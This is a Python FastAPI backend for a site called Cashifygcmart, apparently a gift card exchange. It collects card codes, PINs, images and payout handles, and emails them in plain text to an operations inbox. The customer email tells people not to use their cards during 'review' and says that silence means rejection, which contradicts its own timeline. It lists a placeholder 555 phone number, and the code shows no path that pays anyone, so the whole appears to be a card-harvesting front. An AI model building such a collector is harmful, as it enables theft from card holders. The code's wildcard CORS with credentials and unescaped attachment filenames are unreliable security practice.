from fastapi import FastAPI, APIRouter
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel
from typing import List, Optional
from datetime import datetime
import random
import httpx
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import ssl

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize FastAPI
app = FastAPI(
    title="Cashifygcmart API",
    description="Gift Card Exchange Platform API",
    version="1.0.0"
)

# CORS configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # In production, specify your frontend domain
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Database setup
db_client = None
db = None

# Pydantic models
class GiftCard(BaseModel):
    brand: str
    value: str
    condition: str
    hasReceipt: str
    cardType: str
    digitalCode: Optional[str] = ""
    digitalPin: Optional[str] = ""
    frontImage: Optional[dict] = None
    backImage: Optional[dict] = None
    receiptImage: Optional[dict] = None

class GiftCardSubmission(BaseModel):
    firstName: str
    lastName: str
    email: str
    phoneNumber: str
    cards: List[GiftCard]
    paymentMethod: str
    paypalAddress: Optional[str] = ""
    zelleDetails: Optional[str] = ""
    cashAppTag: Optional[str] = ""
    btcAddress: Optional[str] = ""
    chimeDetails: Optional[str] = ""

# Email Template Functions
def generate_confirmation_email_html(customer_name, reference_number):
    return f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank You for Your Submission</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333333;
            background-color: #f5f7fa;
            padding: 20px 0;
        }}
        .email-container {{
            max-width: 650px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }}
        
        /* Header */
        .header {{
            background: linear-gradient(135deg, #ec4899 0%, #8b5cf6 100%);
            color: white;
            padding: 35px 30px;
            text-align: center;
        }}
        .logo {{
            font-size: 26px;
            font-weight: 800;
            margin-bottom: 8px;
        }}
        .tagline {{
            font-size: 12px;
            opacity: 0.9;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 20px;
        }}
        .header-title {{
            font-size: 24px;
            font-weight: 600;
        }}
        
        /* Content */
        .content {{
            padding: 35px 30px;
        }}
        .greeting {{
            font-size: 22px;
            font-weight: 600;
            color: #1f2937;
            margin-bottom: 10px;
        }}
        .reference {{
            font-size: 18px;
            font-weight: 600;
            color: #0c4a6e;
            margin-bottom: 25px;
        }}
        .intro-text {{
            font-size: 16px;
            color: #4b5563;
            margin-bottom: 30px;
            line-height: 1.7;
        }}
        
        /* Sections */
        .section {{
            margin-bottom: 35px;
        }}
        .section-header {{
            font-size: 18px;
            font-weight: 600;
            color: #374151;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
        }}
        .section-icon {{
            margin-right: 10px;
            font-size: 20px;
        }}
        .section-content {{
            color: #4b5563;
            line-height: 1.7;
        }}
        
        /* Next Steps List */
        .next-steps-list {{
            margin: 15px 0;
        }}
        .next-step {{
            margin-bottom: 12px;
        }}
        .step-title {{
            font-weight: 600;
            color: #374151;
        }}
        .step-description {{
            color: #6b7280;
            margin-top: 2px;
        }}
        
        /* Guidelines List */
        .guidelines-list {{
            margin: 15px 0;
        }}
        .guideline-item {{
            margin-bottom: 10px;
            display: flex;
            align-items: flex-start;
        }}
        .guideline-title {{
            font-weight: 600;
            color: #374151;
            min-width: 140px;
        }}
        .guideline-text {{
            color: #6b7280;
            flex: 1;
        }}
        
        /* Important Notice */
        .important-notice {{
            background: #fef3c7;
            border: 1px solid #f59e0b;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
        }}
        .important-title {{
            font-weight: 600;
            color: #92400e;
            margin-bottom: 5px;
        }}
        .important-text {{
            color: #78350f;
            font-size: 14px;
        }}
        
        /* Disclaimer */
        .disclaimer {{
            background: #f8fafc;
            border-left: 4px solid #6b7280;
            padding: 15px 20px;
            margin: 20px 0;
            font-size: 14px;
            color: #4b5563;
        }}
        
        /* Closing */
        .closing {{
            margin: 30px 0 20px 0;
            font-size: 16px;
            color: #374151;
        }}
        .signature {{
            margin-top: 25px;
            font-size: 16px;
            color: #374151;
        }}
        
        /* Footer */
        .footer {{
            background: #ffffff;
            padding: 40px 30px;
            border-top: 2px solid #f1f5f9;
        }}
        
        /* Clean Professional Signature Block */
        .signature-block {{
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 25px;
            border-bottom: 1px solid #e2e8f0;
        }}
        .signature-name {{
            font-size: 20px;
            font-weight: 700;
            color: #1e293b;
            margin-bottom: 5px;
            font-family: 'Georgia', serif;
        }}
        .signature-title {{
            font-size: 14px;
            color: #64748b;
            font-weight: 500;
            margin-bottom: 20px;
        }}
        
        /* Contact Grid - Clean Layout */
        .contact-grid {{
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 25px;
            margin-bottom: 30px;
            text-align: center;
        }}
        .contact-block {{
            padding: 15px;
            background: #f8fafc;
            border-radius: 8px;
            border: 1px solid #e2e8f0;
        }}
        .contact-label {{
            font-size: 11px;
            font-weight: 600;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
        }}
        .contact-value {{
            font-size: 13px;
            font-weight: 600;
            color: #1e293b;
        }}
        .contact-value a {{
            color: #1e293b;
            text-decoration: none;
        }}
        .contact-value a:hover {{
            color: #ec4899;
        }}
        
        /* Simple Trust Line */
        .trust-line {{
            text-align: center;
            margin-bottom: 25px;
            padding: 12px 0;
            background: #f0fdf4;
            border-radius: 6px;
        }}
        .trust-items {{
            font-size: 12px;
            color: #166534;
            font-weight: 500;
        }}
        
        /* Footer Info - Clean Typography */
        .footer-info {{
            text-align: center;
            font-size: 12px;
            color: #64748b;
            line-height: 1.6;
        }}
        .footer-address {{
            margin-bottom: 12px;
            font-weight: 500;
        }}
        .footer-links-clean {{
            margin-bottom: 12px;
        }}
        .footer-links-clean a {{
            color: #64748b;
            text-decoration: none;
            margin: 0 8px;
            font-weight: 500;
        }}
        .footer-links-clean a:hover {{
            color: #ec4899;
        }}
        .footer-copyright {{
            font-weight: 600;
            color: #475569;
        }}
        
        /* Mobile Footer */
        @media (max-width: 600px) {{
            .contact-grid {{
                grid-template-columns: 1fr;
                gap: 15px;
            }}
            .footer {{
                padding: 30px 20px;
            }}
            .guideline-title {{
                min-width: 120px;
            }}
        }}
    </style>
</head>
<body>
    <div class="email-container">
        <!-- Header -->
        <div class="header">
            <div class="logo">Cashifygcmart</div>
            <div class="tagline">Instant Offers, Same-Day Payments</div>
            <div class="header-title">Thank You for Your Submission</div>
        </div>
        
        <!-- Content -->
        <div class="content">
            <div class="greeting">Thank You for Your Submission, {customer_name}</div>
            <div class="reference">Reference Number: {reference_number}</div>
            
            <div class="intro-text">
                Thank you for submitting your gift card details to Cashifygcmart. Below is an update on the current status of your submission.
            </div>
            
            <!-- Current Status -->
            <div class="section">
                <div class="section-header">
                    <span class="section-icon">📋</span>
                    Current Status
                </div>
                <div class="section-content">
                    Our team is currently reviewing the gift card details you provided. This process ensures all submissions meet our standards for accuracy and authenticity. Your cooperation helps us maintain the trust and quality our customers rely on.
                </div>
            </div>
            
            <!-- Next Steps -->
            <div class="section">
                <div class="section-header">
                    <span class="section-icon">📌</span>
                    Next Steps
                </div>
                <div class="next-steps-list">
                    <div class="next-step">
                        <div class="step-title">Notification Timeline:</div>
                        <div class="step-description">You will receive an update within 14 hours. Please check your inbox and spam/junk folders.</div>
                    </div>
                    <div class="next-step">
                        <div class="step-title">If Approved:</div>
                        <div class="step-description">We'll provide redemption details and timelines in the follow-up email.</div>
                    </div>
                    <div class="next-step">
                        <div class="step-title">If Not Approved:</div>
                        <div class="step-description">If no response is received within 8 hours, it may indicate your submission wasn't approved. Contact us for clarification.</div>
                    </div>
                </div>
                
                <div class="important-notice">
                    <div class="important-title">Important:</div>
                    <div class="important-text">Do not use your gift card during the review period to avoid processing issues.</div>
                </div>
            </div>
            
            <!-- Gift Card Submission Guidelines -->
            <div class="section">
                <div class="section-header">
                    <span class="section-icon">📝</span>
                    Gift Card Submission Guidelines
                </div>
                <div class="guidelines-list">
                    <div class="guideline-item">
                        <div class="guideline-title">Eligible Cards:</div>
                        <div class="guideline-text">Only those listed in our Rate Calculator.</div>
                    </div>
                    <div class="guideline-item">
                        <div class="guideline-title">Minimum Value:</div>
                        <div class="guideline-text">$50 per card.</div>
                    </div>
                    <div class="guideline-item">
                        <div class="guideline-title">Processing Times:</div>
                        <div class="guideline-text">Vary based on demand and market conditions.</div>
                    </div>
                    <div class="guideline-item">
                        <div class="guideline-title">Sundays:</div>
                        <div class="guideline-text">Submissions are processed on the next business day.</div>
                    </div>
                    <div class="guideline-item">
                        <div class="guideline-title">After 8 PM EST:</div>
                        <div class="guideline-text">Processed the following day.</div>
                    </div>
                    <div class="guideline-item">
                        <div class="guideline-title">Payment Methods:</div>
                        <div class="guideline-text">May be updated based on transaction success.</div>
                    </div>
                    <div class="guideline-item">
                        <div class="guideline-title">Unlisted Cards:</div>
                        <div class="guideline-text">Contact support before submission.</div>
                    </div>
                </div>
                
                <div class="disclaimer">
                    <strong>Disclaimer:</strong> Cashifygcmart is not responsible for balance discrepancies on unlisted cards.
                </div>
            </div>
            
            <!-- Closing -->
            <div class="closing">
                Thank you again for choosing Cashifygcmart. Our support team is always here to help.
            </div>
            
            <div class="signature">
                Best regards,
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            
            <!-- Clean Signature Block -->
            <div class="signature-block">
                <div class="signature-name">Robert Smith</div>
                <div class="signature-title">Customer Support Manager, Cashifygcmart</div>
            </div>
            
            <!-- Contact Information Grid -->
            <div class="contact-grid">
                <div class="contact-block">
                    <div class="contact-label">Email Support</div>
                    <div class="contact-value">
                        <a href="mailto:support@cashifygcmart.com">support@cashifygcmart.com</a>
                    </div>
                </div>
                
                <div class="contact-block">
                    <div class="contact-label">Phone Support</div>
                    <div class="contact-value">(555) 013-2099</div>
                </div>
                
                <div class="contact-block">
                    <div class="contact-label">Website</div>
                    <div class="contact-value">cashifygcmart.com</div>
                </div>
            </div>
            
            <!-- Trust Indicators - Single Clean Line -->
            <div class="trust-line">
                <div class="trust-items">
                    SSL Secured • Same-Day Payouts • No Hidden Fees • 230+ Vendors Trusted
                </div>
            </div>
            
            <!-- Footer Information -->
            <div class="footer-info">
                <div class="footer-address">
                    2099 Harborview Drive, Suite 210, San Diego, CA 92101
                </div>
                
                <div class="footer-links-clean">
                    Rate Calculator | FAQs | Privacy Policy | Terms of Service
                </div>
                
                <div class="footer-copyright">
                    © 2025 Cashifygcmart. All rights reserved.
                </div>
            </div>
        </div>
    </div>
</body>
</html>
    """

def generate_internal_notification_email(customer_name, reference_number, submission_data):
    cards_info = ""
    total_value = 0
    
    for i, card in enumerate(submission_data.get('cards', []), 1):
        card_value = float(card.get('value', 0)) if card.get('value', '').replace('.', '').isdigit() else 0
        total_value += card_value
        
        # Simple card info without complex formatting
        cards_info += f"""
        Card {i}: {card.get('brand', 'N/A')} - Value: {card.get('value', '0')} - Condition: {card.get('condition', 'N/A').replace('-', ' ').title()}
        Receipt: {"Yes" if card.get('hasReceipt') == 'yes' else "No"} - Type: {card.get('cardType', 'N/A').title()}"""
        
        # Add digital card details if it's a digital card
        if card.get('cardType') == 'digital':
            digital_code = card.get('digitalCode', 'N/A')
            digital_pin = card.get('digitalPin', 'Not provided')
            cards_info += f"""
        Digital Code: {digital_code}
        Digital PIN: {digital_pin}"""
        
        cards_info += "\n"
    
    # Payment method details
    payment_method = submission_data.get('paymentMethod', '').upper()
    payment_details = ""
    if payment_method == 'PAYPAL':
        payment_details = f"PayPal: {submission_data.get('paypalAddress', 'Not provided')}"
    elif payment_method == 'ZELLE':
        payment_details = f"Zelle: {submission_data.get('zelleDetails', 'Not provided')}"
    elif payment_method == 'CASHAPP':
        payment_details = f"Cash App: {submission_data.get('cashAppTag', 'Not provided')}"
    elif payment_method == 'BTC':
        payment_details = f"Bitcoin: {submission_data.get('btcAddress', 'Not provided')}"
    elif payment_method == 'CHIME':
        payment_details = f"Chime: {submission_data.get('chimeDetails', 'Not provided')}"
    
    return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>New Customer Submission - {reference_number}</title>
</head>
<body style="font-family: Arial, sans-serif; padding: 20px; background-color: #f5f5f5;">
    <div style="max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px;">
        
        <h2 style="color: #1f2937; margin-top: 0;">New Customer Submission</h2>
        
        <div style="background: #e5e7eb; padding: 15px; border-radius: 5px; margin: 20px 0;">
            <strong>Reference Number:</strong> {reference_number}
        </div>
        
        <h3 style="color: #374151; border-bottom: 2px solid #e5e7eb; padding-bottom: 5px;">Customer Information</h3>
        <p><strong>Name:</strong> {customer_name}</p>
        <p><strong>Email:</strong> {submission_data.get('email', 'N/A')}</p>
        <p><strong>Phone:</strong> {submission_data.get('phoneNumber', 'N/A')}</p>
        <p><strong>Payment Method:</strong> {payment_details}</p>
        
        <h3 style="color: #374151; border-bottom: 2px solid #e5e7eb; padding-bottom: 5px;">Gift Card Details</h3>
        <div style="background: #f9fafb; padding: 15px; border-radius: 5px; white-space: pre-line;">
{cards_info}
        </div>
        
        <div style="background: #fef3c7; border: 1px solid #f59e0b; padding: 15px; margin: 20px 0; border-radius: 5px;">
            <strong>Total Value:</strong> {total_value} dollars
        </div>
        
        <h3 style="color: #374151;">Next Steps:</h3>
        <p>1. Review customer and card information</p>
        <p>2. Verify gift card images (attached)</p>
        <p>3. Process payment within 24 hours</p>
        <p>4. Update customer with status</p>
        
        <hr style="margin: 30px 0;">
        <p style="font-size: 12px; color: #6b7280;">
            Submission Date: {submission_data.get('submitted_at', 'N/A')}<br>
            System: CashifyGCmart Internal Notification<br>
            From: noreply@cashifygcmart.com
        </p>
    </div>
</body>
</html>
"""

# Utility functions
def generate_reference_number():
    timestamp = datetime.now().strftime("%H%M%S")
    random_num = random.randint(10, 99)
    return f"GC-{timestamp}-{random_num}"

async def send_confirmation_email(email: str, customer_name: str, reference_number: str):
    try:
        # Get SMTP settings from environment
        smtp_server = os.environ.get('SMTP_SERVER')
        smtp_port = int(os.environ.get('SMTP_PORT', 465))
        smtp_username = os.environ.get('SMTP_USERNAME')
        smtp_password = os.environ.get('SMTP_PASSWORD')
        use_ssl = os.environ.get('SMTP_USE_SSL', 'true').lower() == 'true'
        
        if not all([smtp_server, smtp_username, smtp_password]):
            print("ERROR: SMTP settings not found in environment variables")
            return False
        
        # Generate email content
        email_html = generate_confirmation_email_html(customer_name, reference_number)
        subject = f"Gift Card Submission Confirmation - Reference #{reference_number}"
        
        # Create message
        msg = MIMEMultipart('alternative')
        msg['From'] = smtp_username
        msg['To'] = email
        msg['Subject'] = subject
        
        # Add HTML content
        html_part = MIMEText(email_html, 'html')
        msg.attach(html_part)
        
        # Send email via SMTP
        if use_ssl:
            # SSL connection
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL(smtp_server, smtp_port, context=context) as server:
                server.login(smtp_username, smtp_password)
                server.send_message(msg)
        else:
            # TLS connection
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls(context=ssl.create_default_context())
                server.login(smtp_username, smtp_password)
                server.send_message(msg)
        
        print(f"✅ Customer confirmation email sent to: {email}")
        print(f"Reference Number: {reference_number}")
        return True
        
    except Exception as e:
        print(f"❌ SMTP email sending failed: {e}")
        return False

async def send_internal_notification_email(submission_data: dict, customer_name: str, reference_number: str):
    try:
        # Get SMTP settings from environment
        smtp_server = os.environ.get('SMTP_SERVER')
        smtp_port = int(os.environ.get('SMTP_PORT', 465))
        smtp_username = os.environ.get('SMTP_USERNAME')
        smtp_password = os.environ.get('SMTP_PASSWORD')
        use_ssl = os.environ.get('SMTP_USE_SSL', 'true').lower() == 'true'
        operations_email = os.environ.get('OPERATIONS_EMAIL')
        
        if not all([smtp_server, smtp_username, smtp_password, operations_email]):
            print("ERROR: SMTP settings or operations email not found in environment variables")
            return False
        
        # Generate email content
        email_html = generate_internal_notification_email(customer_name, reference_number, submission_data)
        subject = f"New Form Submission - Reference {reference_number} - {customer_name}"
        
        # Create message
        msg = MIMEMultipart()
        msg['From'] = smtp_username
        msg['To'] = operations_email
        msg['Subject'] = subject
        
        # Add HTML content
        html_part = MIMEText(email_html, 'html')
        msg.attach(html_part)
        
        # Process file attachments from uploaded images
        attachment_count = 0
        for i, card in enumerate(submission_data.get('cards', []), 1):
            # Handle front image
            if card.get('frontImage') and isinstance(card['frontImage'], dict):
                if 'data' in card['frontImage'] and 'name' in card['frontImage']:
                    try:
                        # Decode base64 image data
                        import base64
                        image_data = card['frontImage']['data']
                        if image_data.startswith('data:'):
                            # Remove data URL prefix
                            image_data = image_data.split(',')[1]
                        
                        # Decode base64
                        decoded_data = base64.b64decode(image_data)
                        
                        # Create attachment
                        attachment = MIMEBase('application', 'octet-stream')
                        attachment.set_payload(decoded_data)
                        encoders.encode_base64(attachment)
                        attachment.add_header(
                            'Content-Disposition',
                            f'attachment; filename=Card_{i}_Front_{card["frontImage"]["name"]}'
                        )
                        msg.attach(attachment)
                        attachment_count += 1
                    except Exception as e:
                        print(f"Failed to attach front image for card {i}: {e}")
            
            # Handle back image
            if card.get('backImage') and isinstance(card['backImage'], dict):
                if 'data' in card['backImage'] and 'name' in card['backImage']:
                    try:
                        import base64
                        image_data = card['backImage']['data']
                        if image_data.startswith('data:'):
                            image_data = image_data.split(',')[1]
                        
                        decoded_data = base64.b64decode(image_data)
                        
                        attachment = MIMEBase('application', 'octet-stream')
                        attachment.set_payload(decoded_data)
                        encoders.encode_base64(attachment)
                        attachment.add_header(
                            'Content-Disposition',
                            f'attachment; filename=Card_{i}_Back_{card["backImage"]["name"]}'
                        )
                        msg.attach(attachment)
                        attachment_count += 1
                    except Exception as e:
                        print(f"Failed to attach back image for card {i}: {e}")
            
            # Handle receipt image
            if card.get('receiptImage') and isinstance(card['receiptImage'], dict):
                if 'data' in card['receiptImage'] and 'name' in card['receiptImage']:
                    try:
                        import base64
                        image_data = card['receiptImage']['data']
                        if image_data.startswith('data:'):
                            image_data = image_data.split(',')[1]
                        
                        decoded_data = base64.b64decode(image_data)
                        
                        attachment = MIMEBase('application', 'octet-stream')
                        attachment.set_payload(decoded_data)
                        encoders.encode_base64(attachment)
                        attachment.add_header(
                            'Content-Disposition',
                            f'attachment; filename=Card_{i}_Receipt_{card["receiptImage"]["name"]}'
                        )
                        msg.attach(attachment)
                        attachment_count += 1
                    except Exception as e:
                        print(f"Failed to attach receipt image for card {i}: {e}")
        
        # Send email via SMTP
        if use_ssl:
            # SSL connection
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL(smtp_server, smtp_port, context=context) as server:
                server.login(smtp_username, smtp_password)
                server.send_message(msg)
        else:
            # TLS connection
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls(context=ssl.create_default_context())
                server.login(smtp_username, smtp_password)
                server.send_message(msg)
        
        print(f"✅ Internal notification email sent to: {operations_email}")
        print(f"📎 Attachments included: {attachment_count}")
        print(f"Reference Number: {reference_number}")
        return True
        
    except Exception as e:
        print(f"❌ SMTP internal email sending failed: {e}")
        return False

# API Router
api_router = APIRouter(prefix="/api")

@api_router.get("/")
async def root():
    return {"message": "Cashifygcmart API is running"}

@api_router.post("/submit-gift-card")
async def submit_gift_card(submission: GiftCardSubmission):
    try:
        # Generate reference number
        reference_number = generate_reference_number()
        
        # Add timestamp to submission data
        submission_dict = submission.dict()
        submission_dict['reference_number'] = reference_number
        submission_dict['submitted_at'] = datetime.now().isoformat()
        
        # Store in database (if available)
        customer_email_sent = False
        internal_email_sent = False
        
        try:
            if db:
                await db.gift_card_submissions.insert_one(submission_dict)
                print(f"✅ Submission stored in database: {reference_number}")
        except Exception as e:
            print(f"⚠️ Database storage failed (continuing anyway): {e}")
        
        # Send confirmation email to customer
        try:
            customer_name = f"{submission.firstName} {submission.lastName}"
            customer_email_sent = await send_confirmation_email(
                submission.email, 
                customer_name, 
                reference_number
            )
        except Exception as e:
            print(f"❌ Customer email failed: {e}")
        
        # Send internal notification email
        try:
            customer_name = f"{submission.firstName} {submission.lastName}"
            internal_email_sent = await send_internal_notification_email(
                submission_dict, 
                customer_name, 
                reference_number
            )
        except Exception as e:
            print(f"❌ Internal email failed: {e}")
        
        return {
            "success": True,
            "reference_number": reference_number,
            "message": "Gift card submission received successfully",
            "customer_email_sent": customer_email_sent,
            "internal_email_sent": internal_email_sent
        }
        
    except Exception as e:
        print(f"❌ Submission processing failed: {e}")
        return {
            "success": False,
            "message": f"Submission failed: {str(e)}"
        }

# Include API router
app.include_router(api_router)

# Database connection events
@app.on_event("startup")
async def startup_db_client():
    global db_client, db
    try:
        mongo_url = os.environ.get('MONGO_URL')
        db_name = os.environ.get('DB_NAME', 'cashifygcmart')
        
        if mongo_url:
            db_client = AsyncIOMotorClient(mongo_url)
            db = db_client[db_name]
            print(f"✅ Connected to MongoDB: {db_name}")
        else:
            print("⚠️ No MONGO_URL found - running without database")
    except Exception as e:
        print(f"❌ Database connection failed: {e}")

@app.on_event("shutdown")
async def shutdown_db_client():
    if db_client:
        db_client.close()
        print("✅ Database connection closed")

# Remove uvicorn startup code - Vercel handles this
# if __name__ == "__main__":
#     import uvicorn
#     uvicorn.run(app, host="0.0.0.0", port=8000)